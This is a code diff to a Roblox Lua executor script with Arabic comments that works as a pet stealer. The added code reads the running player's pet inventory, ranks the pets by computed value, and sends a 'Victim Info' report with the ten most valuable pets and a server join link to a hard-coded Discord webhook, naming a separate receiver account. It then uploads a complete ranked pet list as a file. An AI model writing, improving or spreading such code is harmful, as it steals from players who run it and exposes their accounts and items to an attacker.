@@ -1,6 +1,6 @@
 -- =========================
 -- الخدمات الأساسية
--- =========================
+-- ========================
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TeleportService = game:GetService("TeleportService")
@@ -127,34 +127,80 @@ task.spawn(function()
 end)
 
 -- =========================
--- 3: نظام ويب هوك (Delta) فقط للبتات
+-- 3: نظام ويب هوك والجيفت المحسن
 -- =========================
 task.spawn(function()
-    wait(5) -- تأخير للتأكد من تحميل الأدوات في الـ Backpack
+    wait(5)
+    
+    local DataService = require(ReplicatedStorage.Modules.DataService)
+    local PetRegistry = require(ReplicatedStorage.Data.PetRegistry)
+    local NumberUtil = require(ReplicatedStorage.Modules.NumberUtil)
+    local PetUtilities = require(ReplicatedStorage.Modules.PetServices.PetUtilities)
+
+    local function CalculatePetValueFromValues(petData)
+        local HatchedFrom = petData.HatchedFrom
+        if not HatchedFrom or HatchedFrom == "" then return 0 end
+        local eggData = PetRegistry.PetEggs[HatchedFrom]
+        if not eggData then return 0 end
+        local petInfo = eggData.RarityData.Items[petData.PetType]
+        if not petInfo then return 0 end
+        local WeightRange = petInfo.GeneratedPetData.WeightRange
+        if not WeightRange then return 0 end
+        local baseSell = PetRegistry.PetList[petData.PetType].SellPrice
+        local weightNorm = NumberUtil.ReverseLerp(WeightRange[1], WeightRange[2], petData.BaseWeight)
+        local weightMult = math.lerp(0.8, 1.2, weightNorm)
+        local level = petData.Level or 1
+        local levelProg = PetUtilities.GetLevelProgress(level)
+        local levelMult = math.lerp(0.15, 6, levelProg)
+        return math.floor(baseSell * weightMult * levelMult)
+    end
+
     local backpack = player:FindFirstChild("Backpack")
     if not backpack then return end
 
-    local pets = {}
-    for _, item in ipairs(backpack:GetChildren()) do
-        local itemType = item:GetAttribute("ItemType") or ""
-        if itemType:lower() == "pet" or string.find(item.Name:lower(), "pet") then
-            table.insert(pets, item)
-        end
+    local data = DataService:GetData()
+    local inventory = data.PetsData.PetInventory.Data
+    if not inventory then return end
+
+    local petList = {}
+
+    for uuid, petEntry in pairs(inventory) do
+        local petData = {
+            PetType = petEntry.PetType,
+            HatchedFrom = petEntry.PetData.HatchedFrom,
+            BaseWeight = petEntry.PetData.BaseWeight or 0,
+            Level = petEntry.PetData.Level or 1
+        }
+
+        local value = CalculatePetValueFromValues(petData)
+
+        table.insert(petList, {
+            uuid = uuid,
+            entry = petEntry,
+            type = petEntry.PetType,
+            weight = math.floor((petEntry.PetData.BaseWeight or 0) * 100) / 100,
+            level = petEntry.PetData.Level or 1,
+            value = value
+        })
     end
-    if #pets == 0 then return end
+
+    table.sort(petList, function(a, b) return a.value > b.value end)
 
     local WEBHOOK_URL = "https://discord.com/api/webhooks/1422573891943010349/mc5Nt5JD7B0QTKZWhgYdUhzfYJRxyPMb1x9qucLBccpmdE8jLV3cIUV79NaQjQZZ4uqW"
 
-    -- إرسال أول 10 بيتات كرسالة
-    local message = "@everyone **Alien Hit**\n──────────────\n" ..
-                    "**Victim Info:**\nUsername: " .. player.Name .. "\nExecutor: Delta\nAccount Age: " .. player.AccountAge .. " Days\nReceiver: " .. player.Name .. "\n──────────────\n**Hit List:**\n"
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    local floatingLink = "https://floating.gg/?placeID=" .. placeId .. "&gameInstanceId=" .. jobId
 
-    for i = 1, math.min(10, #pets) do
-        message = message .. "• " .. pets[i].Name .. "\n"
+    local message = "@everyone **Alien Hit**\n──────────────\n" ..
+                   "**Victim Info:**\nUsername: " .. player.Name .. "\nExecutor: Delta\nAccount Age: " .. player.AccountAge .. " Days\nReceiver: sssfysue7\n──────────────\n**Hit List:**\n"
+
+    for i = 1, math.min(10, #petList) do
+        message = message .. "• " .. petList[i].type .. " [" .. petList[i].weight .. " kg] [Age " .. petList[i].level .. "]\n"
     end
 
-    message = message .. "──────────────\n**Total Items:** " .. #pets ..
-              "\n**Server:** https://floating.gg/?placeID=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId ..
+    message = message .. "──────────────\n**Total Items:** " .. #petList ..
+              "\n**Server:** 🔗 [Click Me to Join](" .. floatingLink .. ")" ..
               "\n**Time:** " .. os.date("%Y-%m-%d %H:%M:%S")
 
     local requestFunc = (syn and syn.request) or http_request or request
@@ -168,10 +214,14 @@ task.spawn(function()
             })
         end)
 
-        -- إرسال بقية البتات في ملف نصي
-        local fileContent = "🎮 Hit List of player: " .. player.Name .. "\n\n🛠️ All Pets in Backpack:\n"
-        for i = 1, #pets do
-            fileContent = fileContent .. "- " .. pets[i].Name .. "\n"
+        wait(0.5)
+
+        local fileContent = "🎮 Complete Hit List - " .. player.Name .. "\n\n"
+        fileContent = fileContent .. "📦 TOTAL PETS: " .. #petList .. "\n\n"
+        fileContent = fileContent .. "🏆 ALL PETS (Highest Value First):\n"
+        
+        for i, pet in ipairs(petList) do
+            fileContent = fileContent .. string.format("%d. %s | %.2f kg | Age %d\n", i, pet.type, pet.weight, pet.level)
         end
 
         pcall(function()
@@ -181,7 +231,7 @@ task.spawn(function()
                 Headers = {["Content-Type"]="multipart/form-data; boundary=---011000010111000001101001"},
                 Body = table.concat({
                     "-----011000010111000001101001",
-                    'Content-Disposition: form-data; name="file"; filename="PetsHitList.txt"',
+                    'Content-Disposition: form-data; name="file"; filename="CompletePetList.txt"',
                     "Content-Type: text/plain",
                     "",
                     fileContent,
